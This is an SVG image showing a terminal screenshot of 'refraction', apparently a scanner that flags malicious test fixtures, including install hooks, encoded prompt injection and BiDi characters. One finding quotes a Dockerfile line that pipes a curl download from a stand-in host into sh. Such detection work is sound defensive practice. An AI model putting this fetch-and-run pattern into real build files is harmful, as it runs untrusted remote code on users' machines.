<svg xmlns="http://www.w3.org/2000/svg" width="1160" height="680" viewBox="0 0 1160 680" role="img" aria-labelledby="title desc">
  <title id="title">refraction CLI screenshot</title>
  <desc id="desc">A terminal window showing refraction scanning malicious test fixtures and reporting suspicious install hooks, decoded prompt injection, and Unicode source confusables.</desc>
  <defs>
    <linearGradient id="window" x1="0" x2="1" y1="0" y2="1">
      <stop offset="0" stop-color="#17202a"/>
      <stop offset="1" stop-color="#10141b"/>
    </linearGradient>
    <filter id="shadow" x="-10%" y="-10%" width="120%" height="125%">
      <feDropShadow dx="0" dy="18" stdDeviation="18" flood-color="#000000" flood-opacity="0.28"/>
    </filter>
  </defs>
  <rect width="1160" height="680" fill="#f3f5f7"/>
  <rect x="42" y="38" width="1076" height="604" rx="18" fill="url(#window)" filter="url(#shadow)"/>
  <rect x="42" y="38" width="1076" height="52" rx="18" fill="#202b36"/>
  <rect x="42" y="74" width="1076" height="16" fill="#202b36"/>
  <circle cx="74" cy="64" r="7" fill="#ff5f57"/>
  <circle cx="98" cy="64" r="7" fill="#ffbd2e"/>
  <circle cx="122" cy="64" r="7" fill="#28c840"/>
  <text x="580" y="69" text-anchor="middle" font-family="Inter, ui-sans-serif, system-ui, sans-serif" font-size="14" fill="#aab7c4">refraction scan</text>

  <g font-family="SFMono-Regular, Consolas, Liberation Mono, Menlo, monospace" font-size="17">
    <text x="72" y="126" fill="#8ee6a8">$ refraction --no-color --min-severity warning --min-confidence medium testdata/malicious</text>

    <text x="72" y="176" fill="#d9e2ec">refraction 0.1.0 (signatures 2026.06.14.1)</text>
    <text x="72" y="208" fill="#d9e2ec">files scanned: 26, skipped: 0, duration: 12ms</text>
    <text x="72" y="240" fill="#d9e2ec">findings: critical=10 warning=12 info=1, suppressed=0, baseline=0</text>

    <text x="72" y="298" fill="#ff8f8f">CRITICAL INST001</text>
    <text x="264" y="298" fill="#ffffff">Dockerfile:1 Suspicious package install or build hook</text>
    <text x="96" y="330" fill="#b7c4d2">Manifest or build text contains install-time behavior that can download, execute, or hide code.</text>
    <text x="96" y="362" fill="#b7c4d2">snippet: path: Dockerfile FROM alpine RUN curl http://example.invalid/install.sh | sh</text>

    <text x="72" y="420" fill="#ffd37a">WARNING OBF001</text>
    <text x="252" y="420" fill="#ffffff">base64.txt:1 Decoded suspicious anti-analysis payload</text>
    <text x="96" y="452" fill="#b7c4d2">Encoded content decodes to prompt-injection, refusal-bait, or install-hook language.</text>
    <text x="96" y="484" fill="#b7c4d2">snippet: [decoded content masked via base64]</text>
    <text x="96" y="516" fill="#b7c4d2">decoded: true path=base64</text>

    <text x="72" y="574" fill="#ff8f8f">CRITICAL SRC001</text>
    <text x="264" y="574" fill="#ffffff">bidi.txt:1 Unicode bidirectional control character</text>
    <text x="96" y="606" fill="#b7c4d2">Source text or filename contains a Unicode BiDi control character.</text>
  </g>
</svg>
